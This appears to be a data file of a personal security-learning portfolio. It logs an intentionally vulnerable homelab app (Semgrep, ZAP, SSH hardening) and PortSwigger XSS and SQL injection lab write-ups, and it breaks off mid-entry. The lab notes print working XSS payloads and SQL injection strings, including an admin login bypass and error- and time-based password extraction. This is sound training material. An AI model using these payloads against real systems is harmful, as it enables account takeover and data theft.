      },
      {
        label: 'Second scan, after a first pass at the headers',
        url: '/zap-report-2.html',
      },
      {
        label: 'Third scan, final',
        url: '/zap-report-3.html',
      },
    ],
  },
  {
    id: 'appsec-homelab-entry-9-first-zap-scan',
    date: '2026-09-03',
    category: 'AppSec Homelab',
    vulnTypes: ['AppSec Homelab'],
    title: 'First ZAP baseline scan',
    workedOn: [
      'Ran the first OWASP ZAP baseline scan against the app deployed on the mini PC, adding the DAST layer alongside Semgrep (SAST) and gitleaks (secrets)',
      'Read the first report: no high-risk findings, 2 medium and 6 low, all missing or weak response headers rather than active exploits',
      'Did a first pass at the headers in the nginx config and re-ran the same scan for a before and after: the clickjacking, content-type, and server-header findings are gone, and CSP is now present but still weak',
      "Worked through an scp mix-up caused by running the copy from inside the mini PC's own SSH session instead of a fresh Mac terminal",
    ],
    body: [
      'With the app deployed and running on the mini PC, I ran the first ZAP baseline scan against it: docker run -t -v $(pwd):/zap/wrk/:rw zaproxy/zap-stable zap-baseline.py -t http://192.168.88.13:8080 -r zap-report.html. That is the DAST layer, and the first time the three automated checks run end to end. Semgrep already covers SAST and gitleaks covers secrets.',
      "Getting the report back to my Mac tripped me up briefly. I ran scp from inside the mini PC's own SSH session rather than a fresh terminal on the Mac, so it tried to connect back to itself and write to a macOS path that does not exist on Linux. Re-running it from an actual Mac terminal pulled it through. Check hostname before running anything that depends on which machine you are actually on.",
      'The first report came back with no high-risk findings, which is expected for a baseline scan since it is passive only. It will not catch the SQL injection or broken access control I built into the app and already found by hand in Burp. What it flagged was all response headers: 2 medium and 6 low. The medium ones were no Content-Security-Policy and no anti-clickjacking header. The low ones were the missing Cross-Origin-Embedder-Policy, Cross-Origin-Opener-Policy, and Cross-Origin-Resource-Policy headers, no Permissions-Policy, a missing X-Content-Type-Options header, and the Server header leaking its version.',
      'I did a first pass at fixing these in the nginx config: added a Content-Security-Policy, an X-Frame-Options header, and X-Content-Type-Options, and turned off the Server version token. Then I re-ran the exact same scan. The second report is cleaner. The clickjacking, content-type, and server-header findings are gone. CSP moved from missing to two medium findings, because the policy I added leaves a directive undefined with no fallback and still allows inline styles. The three cross-origin headers and the Permissions-Policy header are still open.',
      'None of those are the injection bugs I planted. They are a different category, more about defense in depth and browser-level protections than direct exploitation, but they are still real findings and a good complement to the manual work.',
      'Where things stand: SAST, secrets scanning, and DAST are all working against a codebase I built and can walk through in detail. Both scans are in the repo now as a before and after. Next is to tighten the CSP so it has no undefined directives and drops unsafe-inline, add the cross-origin and permissions headers, and run a third pass.',
      'This is the part that ties the pipeline story together for the portfolio: manual testing in Burp plus three automated layers, all pointed at my own code. The scp mix-up was minor but it is another real troubleshooting moment worth keeping in the notes rather than smoothing over.',
    ],
    tools: ['OWASP ZAP', 'Docker', 'Semgrep', 'gitleaks'],
    tags: [
      'AppSec homelab',
      'DAST',
      'OWASP ZAP',
      'security headers',
      'CI/CD pipeline',
    ],
    links: [
      {
        label: 'First ZAP baseline report',
        url: '/zap-report.html',
      },
      {
        label: 'Second scan, after a first pass at the headers',
        url: '/zap-report-2.html',
      },
    ],
  },
  {
    id: 'appsec-homelab-entry-8-docker-deploy',
    date: '2026-09-03',
    category: 'AppSec Homelab',
    vulnTypes: ['AppSec Homelab'],
    title: 'Docker deployment and a separate GitHub key',
    workedOn: [
      'Switched the mini PC to a text-only boot (multi-user.target) to free the RAM the desktop environment was using, and confirmed SSH still connects after the reboot',
      'Generated a dedicated SSH key on the mini PC for GitHub and registered it as its own key, so the mini PC and the Mac authenticate independently',
      'Cloned the appsec-homelab repo onto the mini PC and brought the app up with docker compose up -d --build',
      'Opened port 8080 through ufw scoped to the home subnet only (192.168.88.0/24), not a blanket allow',
    ],
    body: [
      'Picking up from yesterday. Three things I wanted done today: move the mini PC to a lighter headless boot, get a GitHub key set up on the box that is independent of my Mac, and get the vulnerable homelab app running in Docker on it.',
      'First, the boot target. sudo systemctl set-default multi-user.target && sudo reboot drops the desktop environment on boot and frees the RAM it was holding, which I want back for Docker and ZAP later. The thing to check afterwards was SSH, since there is no desktop to fall back on now if it does not come up. It reconnected cleanly.',
      "Second, the GitHub key. I overwrote my Mac's portfolio GitHub key by accident yesterday, so I was careful here not to touch the existing key pair between the Mac and the mini PC. I generated a fresh key directly on the mini PC and added its public key to GitHub as a separate registered key. Each machine now authenticates to GitHub on its own.",
      'Third, the app. git clone of the appsec-homelab repo, then docker compose up -d --build to build and start the containers in one step.',
      'Then the firewall rule to reach it: sudo ufw allow from 192.168.88.0/24 to any port 8080 proto tcp. I scoped this to my home subnet rather than allowing 8080 from anywhere. The app is intentionally vulnerable, so there is no reason for that port to be reachable from outside the local network, even by accident.',
      'Where things stand: the mini PC boots headless into a text console and runs Docker, and the homelab app is containerized and reachable on port 8080 from devices on my home network. Next is to confirm the app loads from my Mac, then start pointing OWASP ZAP at it for the DAST layer of the pipeline.',
      'The scoped ufw rule is a small thing, but it is the kind of default worth keeping visible in the eventual writeup. Running a deliberately vulnerable app on the network means being deliberate about what can reach it.',
    ],
    screenshot: 'Homelab/HomeLab2.webp',
    tools: ['systemd', 'OpenSSH', 'Docker Compose', 'ufw', 'Git'],
    tags: [
      'AppSec homelab',
      'Linux',
      'Docker',
      'SSH',
      'ufw',
      'headless server',
    ],
  },
  {
    id: 'appsec-homelab-entry-7-mini-pc-setup',
    date: '2026-09-02',
    category: 'AppSec Homelab',
    vulnTypes: ['AppSec Homelab'],
    title: 'Mini PC setup and SSH hardening',
    workedOn: [
      'Set up the mini PC (shipped with Linux Mint) as the base for the AppSec homelab, and decided to keep Mint rather than wipe to Ubuntu Server',
      'Diagnosed a "no signal" display fault after boot - turned out to be the HDMI cable, not GRUB or the graphics drivers',
      'Diagnosed SSH connection failures from my Mac - a stale IP address and the wrong username, not a network or firewall problem',
      'Hardened SSH: key-based auth only, password and root login disabled, ufw enabled, fail2ban installed',
      'Installed Docker on the mini PC over SSH from the Mac',
    ],
    body: [
      'The mini PC arrived today. It came with Linux Mint pre-installed and I decided to keep it rather than wipe to Ubuntu Server. It is Ubuntu underneath, so apt and Docker tooling are identical, and the only cost is a bit more overhead from the desktop environment. Most of the day went into troubleshooting rather than the hardening steps themselves.',
      'First boot got to the desktop and then the monitor lost signal entirely. I booted into the GRUB console (Shift or Esc at boot) to check for a corrupted bootloader: ls showed both partitions (hd0,gpt1 and hd0,gpt2) present and healthy, and grub.cfg was intact on gpt2, so the disk and GRUB were fine. I then suspected a graphics driver issue, since the signal dropped right as the desktop environment loaded, just after the login screen. That was also a dead end. It was the cable. Swapping HDMI for DisplayPort fixed it outright. Next time, check the cable before the drivers or GRUB.',
      'Then set up SSH on the mini PC, tried to connect from my Mac, and got connection timeouts followed by "no route to host". I confirmed the Mac and mini PC were on the same subnet (192.168.88.x), confirmed sshd was running (systemctl status ssh showed active), and confirmed ufw was not blocking it (inactive at the time). The real problem was the IP address: I was using 192.168.88.225, which was stale, and the current address was 192.168.88.13. On DHCP, re-check ip a fresh rather than trusting an address from a few minutes earlier.',
      'The other half of that was the username. I was trying to connect as charlesgoodsir, but the account on the mini PC is owner. Once corrected, ssh-copy-id and key-based login worked cleanly.',
      'Hardening done today: SSH key-based authentication set up with ssh-copy-id from the Mac; password authentication and root login disabled in sshd_config (PasswordAuthentication no, PermitRootLogin no); key-only login verified in a second terminal before closing the first, so I did not lock myself out; ufw installed and enabled with OpenSSH explicitly allowed; fail2ban installed and running.',
      'With key login working, installed Docker on the mini PC entirely over SSH from the Mac. No keyboard or monitor on the box from here.',
      'Still to do: a DHCP reservation on the router for 192.168.88.13 so the IP stops shifting, then deploy the homelab vulnerable app on this box and point OWASP ZAP at it to complete the DAST layer of the CI/CD pipeline.',
      'Most of today went on ruling out bootloader, driver, network, and firewall causes before landing on the simple ones: a bad cable, a stale IP, a wrong username. That is what the work usually looks like. Writing up the diagnosis path in the repo is worth more than a list of the commands that ran.',
    ],
    screenshot: 'Homelab/HomeLab1.webp',
    tools: ['Linux Mint', 'GRUB', 'OpenSSH', 'ufw', 'fail2ban'],
    tags: [
      'AppSec homelab',
      'Linux',
      'SSH hardening',
      'ufw',
      'fail2ban',
      'troubleshooting',
    ],
  },
  {
    id: 'portswigger-xss-labs-6-8',
    date: '2026-09-02',
    category: 'PortSwigger Labs',
    vulnTypes: ['XSS'],
    title:
      'Cross-Site Scripting (XSS) labs 6-8 (jQuery sinks + encoded attribute)',
    workedOn: [
      'Kept going on the PortSwigger XSS path, Labs 6 through 11',
      'Labs 6 and 7: DOM XSS through jQuery sinks - an .attr() href sink and a hashchange selector sink',
      'Labs 8 to 10: reflected and stored XSS where the filter encodes angle brackets, so the way in is breaking out of an attribute or a JavaScript string',
      'Lab 11: first practitioner-level lab, DOM XSS through an AngularJS expression',
    ],
    body: [
      'More XSS today, and the labs move from the jQuery sinks into filters that encode angle brackets. Once a fresh tag is off the table, the pattern becomes: work out exactly what context the value lands in - an href, a JavaScript string, an Angular expression - and break out of that instead.',
      'Lab 7 was the long one. Getting an alert in the console was quick. Turning that into something that fires for another user meant working out how to make the hashchange event trigger on its own, which is where the exploit-server iframe comes in.',
      "Lab 11 is the first practitioner-level lab and the first time the target is a framework I do not use. It is an AngularJS app, and the payload works by reaching Angular's scope through $eval and the Function constructor. Did it as a code-along. The takeaway that stuck: moving into security means I cannot just know React and C# well, I need enough of a model of jQuery, AngularJS, and whatever else to spot where they go wrong.",
    ],
    labs: [
      {
        title:
          'Lab 6: DOM XSS in jQuery anchor href attribute sink using location.search source',
        notes: [
          'The vulnerable link is the "Back" link on the Submit Feedback form. There are a few back links around the site, but that is the only one actually labelled "back".',
          "The sink reads the returnPath query param and drops it straight into the href: $('#backLink').attr(\"href\", (new URLSearchParams(window.location.search)).get('returnPath')).",
          'Clicking the link normally just navigates to "/" via that value.',
          'The value lands inside the href attribute with no clean way to break out of it, so the move is to run JS inside the attribute with a javascript: URL instead.',
          'The lab wants document.cookie in the alert, so returnPath=javascript:alert(document.cookie). Loading that URL and clicking the Back link fires the alert and shows the DOM has been manipulated.',
        ],
        solution:
          '/feedback?returnPath=javascript:alert(document.cookie)\n\nSet as the returnPath param; the alert fires on clicking the Back link.',
        status: 'completed',
        screenshot: 'Burp/Lab6XSS.webp',
      },
      {
        title:
          'Lab 7: DOM XSS in jQuery selector sink using a hashchange event',
        notes: [
          'On the blog. The hashchange handler decodes window.location.hash and concatenates it straight into a jQuery selector:',
          "$(window).on('hashchange', function(){ var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')'); if (post) post.get(0).scrollIntoView(); });",
          'Played with it in the console first. window.location.hash shows the hash; .slice(1) strips the leading #. Forgot the (1) on the first go and got an error, then it returned the raw value without the #.',
          'The selector looks for an h2 whose text contains the hash value, so a matching value scrolls the page to that heading.',
          'Passing an HTML string into :contains() makes jQuery build a detached element rather than match one. `$(\'section.blog-list h2:contains(<img src="0" onerror="alert()">)\')` returns a node even though nothing on the page matches it.',
          'Confirmed the detached element is live by setting myimg.src = 0 in the console, which fired a request that timed out with a 504.',
          'A real user will not change the hash by hand, so the payload has to trigger hashchange itself. Used the exploit server to deliver an iframe that appends to its own src after it loads:',
          '<iframe src="https://LAB-ID.web-security-academy.net/#" onload="this.src+=\'<img src=x onerror=print()>\'"></iframe>',
          'Tested it, confirmed print() fired, then delivered it to the victim.',
        ],
        solution:
          '<iframe src="https://LAB-ID.web-security-academy.net/#" onload="this.src+=\'<img src=x onerror=print()>\'"></iframe>\n\nDelivered from the exploit server.',
        status: 'completed',
        screenshot: 'Burp/Lab7XSS.webp',
        screenshots: ['Burp/Lab7XSS2.webp'],
      },
      {
        title:
          'Lab 8: Reflected XSS into attribute with angle brackets HTML-encoded',
        notes: [
          'Uses the blog search box. Searching for p3p returns no results, but p3p shows up in the DOM inside the search form value attribute.',
          'Angle brackets come back HTML-encoded, so a new tag will not work. Quotes are not encoded, so the way in is to break out of the value attribute and add an event handler.',
          "p3p\" onmouseover='alert()' closes the attribute and adds an onmouseover. Hovering the search box fires the alert.",
        ],
        solution: "p3p\" onmouseover='alert()'",
        status: 'completed',
        screenshot: 'Burp/Lab8XSS.webp',
        screenshots: ['Burp/Lab8XSS2.webp'],
      },
      {
        title:
          'Lab 9: Stored XSS into anchor href attribute with double quotes HTML-encoded',
        notes: [
          'First stored attack in this batch. The payload gets saved and sits there until another user triggers it, rather than firing on my own request.',
          "On the blog comment form, the website field is rendered back as the href of a link on the commenter's name, so other users can visit their site.",
          'Double quotes come back HTML-encoded, so breaking out of the attribute is off the table, but a javascript: URL still works as the href value.',
          'Put javascript:alert() in the website field. The alert fires when someone clicks the name link on the comment.',
        ],
        solution: 'javascript:alert()',
        status: 'completed',
        screenshot: 'Burp/Lab9XSS.webp',
        screenshots: ['Burp/Lab9XSS2.webp'],
      },
      {
        title:
          'Lab 10: Reflected XSS into a JavaScript string with angle brackets HTML encoded',
        notes: [
          'The search term is reflected into a JavaScript string literal, not HTML:',
          "var searchTerms = 'p3p'; document.write('<img src=\"/resources/images/tracker.gif?searchTerms=' + encodeURIComponent(searchTerms) + '\">');",
          'Angle brackets are HTML-encoded so a new tag will not land, but the single quote is not encoded, so I can close the string and add my own code.',
          "Searched p3p'; alert(); and checked the DOM. The string closed cleanly and the alert call was sitting there as its own statement.",
          "Tidied it so the rest of the line stays valid JavaScript: p3p'; alert(); let cake = 'test re-opens a string for the trailing '; so nothing after it throws a syntax error.",
        ],
        solution:
          "p3p'; alert(); let cake = 'test\n\nAlso works as a self-contained break-in: '-alert()-'",
        status: 'completed',
        screenshot: 'Burp/Lab10XSS.webp',
      },
      {
        title:
          'Lab 11: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded',
        notes: [
          'First practitioner-level lab, and the first one on a framework I do not use.',
          'The search box sits inside an AngularJS app. Tested {{ 1+1 }} and it rendered 2, so Angular is evaluating template expressions in the reflected value.',
          'Angle brackets and double quotes are both encoded, so the classic tag or attribute injection is blocked. The way in is an Angular expression that reaches back out to JavaScript.',
          "{{ $eval.constructor('alert()')() }} uses $eval's constructor (the Function constructor) to build a function that runs alert() and calls it.",
          'Did this one as a code-along. The part worth keeping: Angular expressions run against a scope, and $eval plus the Function constructor is the bridge from that scope back to normal JS. Something to come back to when I hit more sandbox-escape labs.',
        ],
        solution: "{{ $eval.constructor('alert()')() }}",
        status: 'completed',
        screenshot: 'Burp/Lab11XSS.webp',
      },
    ],
    tools: ['Burp Suite', 'Web Browser', 'Chrome DevTools'],
    tags: [
      'XSS',
      'DOM XSS',
      'reflected XSS',
      'stored XSS',
      'jQuery',
      'AngularJS',
      'hashchange',
      'javascript: URI',
    ],
    link: {
      label: 'Cross-site scripting (XSS)',
      url: 'https://portswigger.net/web-security/cross-site-scripting',
    },
  },
  {
    id: 'portswigger-xss-labs-2-5',
    date: '2026-09-01',
    category: 'PortSwigger Labs',
    vulnTypes: ['XSS'],
    title: 'Cross-Site Scripting (XSS) labs 2-5 (stored XSS + DOM XSS)',
    workedOn: [
      'Back into the PortSwigger XSS path after a holiday break - completed Labs 2 through 5',
      'Lab 2: stored XSS via a blog comment field with no output encoding',
      'Labs 3-5: DOM-based XSS through document.write and innerHTML sinks fed from location.search',
    ],
    body: [
      "Back from a long holiday and easing back into the PortSwigger labs and Burp while I wait on a mini PC to arrive - that one's going to become a Cyber home lab for standing up my own exploitable apps to practice against.",
      'Picking the XSS path back up from where I left off at Lab 1. Labs 2-5 move from a straightforward stored XSS into DOM-based XSS, where the bug lives entirely in client-side JavaScript handling the URL and the server never sees the payload.',
      'The through-line for the DOM labs: find the sink (document.write, innerHTML), work out how the URL feeds into it, then shape the payload to break out of whatever HTML context it lands in. innerHTML has its own quirk on top of that - a <script> tag assigned through it shows up in the DOM but never executes, so event handlers like onerror/onload have to do the work instead.',
    ],
    labs: [
      {
        title: 'Lab 2: Stored XSS into HTML context with nothing encoded',
        notes: [
          'The blog comment form stores input and renders it straight back into the page with nothing encoded.',
          'Tested with a plain <h1> tag first - refreshed the blog and the comment came back as a styled header, confirming HTML injection works here.',
          "Because it's stored, the <script> payload doesn't fire on submit - it triggers when the comments page is reloaded and the stored markup is served back.",
        ],
        solution:
          '<script>alert()</script>\n\nPosted as a blog comment; alert fires on reloading the comments page.',
        status: 'completed',
      },
      {
        title:
          'Lab 3: DOM XSS in document.write sink using source location.search',
        notes: [
          'First DOM-based lab - the payload never touches the server, the vulnerability is entirely in the client-side JS that handles the URL.',
          "Searching 'cake' returned no results, but the search term still got written into the page by trackSearch() via document.write().",
          "The sink: document.write('<img src=\"/resources/images/tracker.gif?searchTerms='+query+'\">') with query pulled straight from location.search.",
          'Breaking out of the src attribute with a double quote lets me add my own onload handler - the trailing quote isn\'t needed because the sink appends the closing "> itself.',
        ],
        solution: 'cake" onload="alert()',
        status: 'completed',
      },
      {
        title:
          'Lab 4: DOM XSS in document.write sink using source location.search inside a select element',
        notes: [
          'Same document.write sink as Lab 3, but the injection point is inside a <select> stock-checker, so the payload has to break out of the select/option elements first.',
          'The script reads storeId from the query string and writes it into <option selected>...</option>.',
          "Generic words like 'cake' didn't visibly register - used a unique value (p3p) so I could clearly see it land as the selected option in both the rendered dropdown and the DOM.",
          'Closed the select with </select>, then added an <img> with a broken src so onerror fires the alert. URL-encoded the whole thing so it survives in the query string.',
        ],
        solution:
          "?productId=1&storeId=p3p</select><img src='1' onerror='alert()'>\n\nURL-encoded:\n?productId=1&storeId=p3p%3C/select%3E%3Cimg%20src=%271%27%20onerror=%27alert()%27%3E",
        status: 'completed',
        screenshot: 'Burp/Lab4XSS.webp',
        screenshots: ['Burp/Lab4XSS2.webp'],
      },
      {
        title: 'Lab 5: DOM XSS in innerHTML sink using source location.search',
        notes: [
          'Sink is element.innerHTML = query instead of document.write - doSearchQuery() drops the search term straight into <span id="searchMessage">.',
          "A <script> tag assigned via innerHTML shows up in the DOM but never runs - browsers don't execute script elements inserted that way.",
          'Used an <img> with an invalid src so the onerror handler runs instead - no need to touch the URL, typing it into the search box is enough.',
        ],
        solution: "<img src='0' onerror='alert()'>",
        status: 'completed',
        screenshot: 'Burp/Lab5XSS.webp',
      },
    ],
    tools: ['Burp Suite', 'Web Browser', 'Chrome DevTools'],
    tags: [
      'XSS',
      'stored XSS',
      'DOM XSS',
      'document.write',
      'innerHTML',
      'JavaScript',
    ],
    link: {
      label: 'Cross-site scripting (XSS)',
      url: 'https://portswigger.net/web-security/cross-site-scripting',
    },
  },
  {
    id: 'appsec-homelab-entry-6-documented-false-negative',
    date: '2026-08-06',
    category: 'AppSec Homelab',
    vulnTypes: ['AppSec Homelab', 'SQL Injection'],
    title: 'Leaving the AuthController SQLi as a documented false negative',
    workedOn: [
      'Reverted AuthController.cs back to its original, realistic [FromBody] login endpoint after the Entry 5 investigation',
      'Confirmed the SQL injection is still fully exploitable, and confirmed the pipeline still does not flag it',
      'Documented the gap directly in the repo README rather than changing the endpoint to make the pipeline look more complete than it is',
    ],
    body: [
      'Closing the loop from Entry 5. Reverted AuthController.cs back to its original [FromBody] LoginRequest shape - the realistic version of a login endpoint, not the [FromQuery] version used purely to isolate the cause.',
      "Rebuilt, re-ran, and confirmed administrator'-- still logs in as admin. The vulnerability was never in question - only whether Semgrep would see it, and it doesn't. Same pipeline, same rule, same file: ProductsController.cs still gets flagged, AuthController.cs still doesn't.",
      "Decided against changing the endpoint shape to force a green pipeline. The point of this repo is to show real vulnerabilities and real tool behaviour around them, not to optimise for a clean Actions run. Instead, added a note directly in the README calling out AuthController.cs as a known false negative, with a link back to the Entry 5 investigation explaining exactly why - so anyone reviewing the repo (or the pipeline output) understands it's a documented gap, not an oversight.",
    ],
    tools: ['Semgrep', '.NET / C#', 'GitHub Actions'],
    tags: ['AppSec homelab', 'SQL injection', 'Semgrep', 'SAST limitations'],
    link: {
      label: 'appsec-homelab repo',
      url: 'https://github.com/charles-goodsir/appsec-homelab',
    },
  },
  {
    id: 'appsec-homelab-entry-5-semgrep-frombody-gap',
    date: '2026-08-06',
    category: 'AppSec Homelab',
    vulnTypes: ['AppSec Homelab', 'SQL Injection'],
    title: 'Why Semgrep caught one SQLi and missed the other',
    workedOn: [
      'Investigated why Semgrep flagged the SQL injection in ProductsController.cs but not the structurally identical one in AuthController.cs',
      'Ran Semgrep locally (CLI) against isolated versions of the file to test hypotheses one variable at a time',
      'Identified the root cause: the rule does not treat [FromBody]-bound request objects as a tainted source',
    ],
    body: [
      "This one's been parked since Entry 4 - Semgrep caught the SQLi in ProductsController.cs immediately but said nothing about the same pattern in AuthController.cs. Set out today to find out why instead of assuming it was a coverage gap.",
      'Installed Semgrep locally so I could test changes in seconds instead of pushing to GitHub Actions each time. First step was confirming a control: ran the same rule against ProductsController.cs alone, and it still flagged - so single-file scanning was a valid way to test this, not the cause of the mismatch itself.',
      'Then worked through the differences between the two files one at a time, changing exactly one thing per test and re-scanning:',
      "1. Property access - pulled request.Username/request.Password into plain local variables before interpolating them, in case Semgrep's taint tracking couldn't follow a property dereference. No change - still not flagged.",
      '2. Variable count - reduced the query to a single interpolated value instead of two, in case a multi-variable AND clause was the issue. No change.',
      "3. Clause style - swapped the equality check (Username = '...') for a LIKE '%...%' clause, matching ProductsController.cs's exact style. No change.",
      '4. Record position - moved the LoginRequest record declaration outside the class body, in case a nested record type was interfering with the method analysis. No change.',
      '5. Binding source - swapped [FromBody] LoginRequest request for two plain [FromQuery] string parameters, keeping the exact same SQL string. This one flagged immediately.',
      "That's the answer: Semgrep's csharp-sqli rule tracks taint from [FromQuery]/[FromRoute]-style parameters, but doesn't recognise a [FromBody]-bound complex object as a tainted source at all. It's not about how the SQL string is built - it's about whether the rule ever considers the input untrusted in the first place. Since request.Username never gets marked as tainted, nothing downstream matters, which is why every SQL-string-shaped test came back negative until the binding source itself changed.",
      "This is a real, meaningful gap rather than a quirk - POST-body JSON is the standard way virtually every modern REST API accepts login credentials, and it's exactly the shape that slipped past the default OWASP ruleset here. A GET-with-query-params endpoint doing the identical vulnerable thing gets caught instantly.",
      'Reverted AuthController.cs back to the original [FromBody] version afterwards - the whole point of this app is to keep the vulnerabilities in their most realistic form, and that includes keeping the miss visible for now rather than quietly changing the endpoint shape to make the pipeline look more complete than it is.',
    ],
    tools: ['Semgrep (CLI)', '.NET / C#'],
    tags: [
      'AppSec homelab',
      'SQL injection',
      'Semgrep',
      'SAST limitations',
      'taint analysis',
    ],
    link: {
      label: 'appsec-homelab repo',
      url: 'https://github.com/charles-goodsir/appsec-homelab',
    },
  },
  {
    id: 'appsec-homelab-entry-4-first-pipeline-run',
    date: '2026-08-01',
    category: 'AppSec Homelab',
    vulnTypes: ['AppSec Homelab', 'SQL Injection', 'XSS'],
    title: 'Building the vulnerable app and running the first pipeline scan',
    workedOn: [
      'Built a bare-bones vulnerable-by-design app (.NET/C# backend, TypeScript/React frontend) to test what I learned in the PortSwigger SQLi and XSS labs',
      'Debugged the app from first build errors through to a working login and product search',
      'Manually confirmed the SQLi login bypass and reflected XSS both work as intended',
      'Added a GitHub Actions workflow running Semgrep, and fixed the first real finding it produced',
    ],
    body: [
      "Started today by testing out what I've learned from the labs with SQLi and XSS. Created a new repo specifically for an app that's deliberately vulnerable to these attacks - a bare-bones product search on the main page, with a login that can be bypassed via SQLi.",
      "Haven't done C# in a while, so this doubled as shaking off the cobwebs. Had some assistance from Claude to help jog my memory on different things. Hit a lot of errors getting it building for the first time - login didn't work, product search didn't work. Most were easy fixes once I found them: references not resolving, spelling mistakes, and issues connecting the backend to the frontend.",
      "Once it was up and running, I could test what I'd learned: logging in with administrator'-- and a random password logged me in as admin, and searching <img src=x onerror=alert(1)> triggered the alert. One thing the PortSwigger labs never show is what the code actually looks like behind a vulnerability like this - seeing the raw string concatenation that causes it was useful in a way reading about it isn't.",
      'After committing everything, I set up a GitHub Actions workflow with Semgrep to catch issues automatically. It picked up the SQL injection in ProductsController.cs immediately, which was great to see work. It did NOT flag the XSS in the frontend, though - something to dig into and tweak the ruleset for next time.',
      'The unexpected find was a second blocking issue, unrelated to the app itself: the workflow file was using a mutable actions/checkout@v4 tag rather than a pinned commit SHA, which Semgrep flagged as a supply chain risk (A03:2025 - Software Supply Chain Failures) - tags and branch refs can be silently repointed by the action owner, which is exactly how the trivy-action and kics-github-action compromises happened. Fixed it by pinning to the full SHA: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608 # v4.',
      "That's as far as I got this round. Next step is figuring out why the XSS didn't get flagged and tweaking the Semgrep config to catch it too.",
    ],
    tools: [
      '.NET / C#',
      'TypeScript',
      'React',
      'SQLite',
      'GitHub Actions',
      'Semgrep',
    ],
    tags: [
      'AppSec homelab',
      'SQL injection',
      'XSS',
      'CI/CD pipeline',
      'Semgrep',
      'software supply chain',
    ],
    link: {
      label: 'appsec-homelab repo',
      url: 'https://github.com/charles-goodsir/appsec-homelab',
    },
    screenshots: [
      'Homelab/SQLiHomeLabDay1.webp',
      'Homelab/XSSHomeLabDay1.webp',
      'Homelab/WorkflowRunningDay1.webp',
      'Homelab/FirstWorkflowResultDay1.webp',
    ],
  },
  {
    id: 'portswigger-xss-labs-1',
    date: '2026-07-30',
    category: 'PortSwigger Labs',
    vulnTypes: ['XSS'],
    title: 'Cross-Site Scripting (XSS) lab 1 (reflected XSS)',
    workedOn: [
      'Started the PortSwigger Cross-Site Scripting (XSS) learning path',
      'Completed Lab 1: reflected XSS into an HTML context with nothing encoded',
    ],
    body: [
      'First attempt at XSS after finishing the SQL injection path. Different mental model to SQLi - instead of manipulating a database query, the goal is getting the browser itself to execute a script that gets reflected back into the page unencoded.',
      'Went in with a rough idea from JavaScript that a <script> tag triggers execution, but the specifics of what actually fires in a browser context took a bit of trial and error.',
    ],
    screenshot: 'Burp/Lab1XSS.webp',
    labs: [
      {
        title: 'Lab 1: Reflected XSS into HTML context with nothing encoded',
        notes: [
          "Started with <script>alert</script> - failed. Referencing alert on its own doesn't call it, it just refers to the function.",
          'Realised alert needs to actually be invoked as a function call: <script>alert(1)</script> - this fired the alert and solved the lab.',
          'Takeaway: the payload needs to be valid, executable JavaScript, not just the presence of a <script> tag - the same rule as writing normal JS in a console.',
        ],
        solution: '<script>alert(1)</script>',
        status: 'completed',
      },
    ],
    tools: ['Web Browser', 'Burp Suite'],
    tags: ['XSS', 'reflected XSS', 'JavaScript'],
    link: {
      label: 'Cross-site scripting (XSS)',
      url: 'https://portswigger.net/web-security/cross-site-scripting',
    },
  },
  {
    id: 'portswigger-sqli-path-complete',
    date: '2026-07-30',
    category: 'PortSwigger Labs',
    vulnTypes: ['SQL Injection'],
    milestone: true,
    title: 'SQL Injection learning path: complete (Community Edition)',
    workedOn: [
      'Finished every SQL injection lab reachable on Burp Suite Community Edition',
      'Labs 15 and 16 remain blocked - both need Burp Collaborator, which is Professional-only',
    ],
    body: [
      'Closing out the SQL injection learning path for now. Went from basic WHERE-clause tautologies through UNION attacks on Oracle, MySQL, and PostgreSQL, blind SQLi via conditional responses, conditional errors, and time delays, and a WAF bypass using XML encoding via Hackvertor.',
      'Labs 15 and 16 need Burp Collaborator, which sits behind a Professional licence. Flagging them as blocked rather than skipping past quietly - revisiting once I upgrade or find a trial window.',
    ],
    screenshot: 'Burp/CompletedSQLiLabs.webp',
    tools: [
      'Burp Suite',
      'Burp Proxy',
      'Burp Repeater',
      'Hackvertor extension',
      'Python',
    ],
    tags: ['SQL injection', 'milestone', 'PortSwigger Web Security Academy'],
    link: {
      label: 'SQL injection labs',
      url: 'https://portswigger.net/web-security/sql-injection',
    },
  },

  {
    id: 'portswigger-sqli-labs-13-17',
    date: '2026-07-30',
    category: 'PortSwigger Labs',
    vulnTypes: ['SQL Injection'],
    title:
      'SQL Injection labs 13-17 (error-based, time-based blind, WAF bypass)',
    workedOn: [
      'Completed labs 13, 14, and 17 on the PortSwigger SQL injection path',
      'Made partial progress on lab 14 (time-based blind) and could not attempt labs 15-16 (out-of-band) on Burp Community Edition',
      'Used CAST()-based error leakage, pg_sleep() time delays, and the Hackvertor extension to bypass a WAF filter',
    ],
    body: [
      'Final session on the SQLi learning path for now. This batch moved from straightforward UNION attacks into blind techniques that lean on errors, timing, and filter evasion rather than direct data output.',
      'Biggest takeaway: blind SQLi is a slower version of the same logic - confirm the injection point, find a reliable true/false signal (an error, a delay, a message), then automate the character-by-character extraction because doing it by hand does not scale past a couple of characters.',
    ],

    labs: [
      {
        title: 'Lab 13: Visible error-based SQL injection',
        notes: [
          'Adding a single quote to the trackingId broke the query and returned a verbose Postgres error, confirming the injection point and leaking the underlying query structure.',
          'Followed the CAST() technique from the code-along to force type-conversion errors that leak data back through the error message.',
          "' AND 1=CAST((SELECT username FROM users) as int)-- initially failed because the subquery returned more than one row.",
          "Adding LIMIT 1 fixed it: ' AND 1=CAST((SELECT username FROM users LIMIT 1) as int)-- leaked the first username directly in the Postgres error text.",
          'Repeated the same pattern against the password column to leak the credential.',
        ],
        solution:
          "' AND 1=CAST((SELECT password FROM users LIMIT 1) as int)--\n\nError message leaked the password directly.",
        status: 'completed',
      },
      {
        title:
          'Lab 14: Blind SQL injection with time delays and information retrieval',
        notes: [
          "Confirmed the injection with ' || pg_sleep(10)-- and timing the Repeater response - just over 10 seconds confirmed it.",
          "Built a conditional delay to ask true/false questions: ' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)-- - first attempt failed from a missing END keyword.",
          'Used the same CASE pattern to confirm the administrator account exists, then started narrowing the password length (>1, >10, >20 all returned a 10s delay, then >20 came back instantly).',
          "Burp Intruder isn't available on Community Edition, so full character-by-character extraction still needs to be scripted rather than done manually.",
        ],
        solution:
          'Scripted the rest of the password using the sqli_solver.py script.',
        status: 'completed',
        script: 'LabScripts/lab14.py',
      },
      {
        title: 'Lab 15: Blind SQL injection with out-of-band interaction',
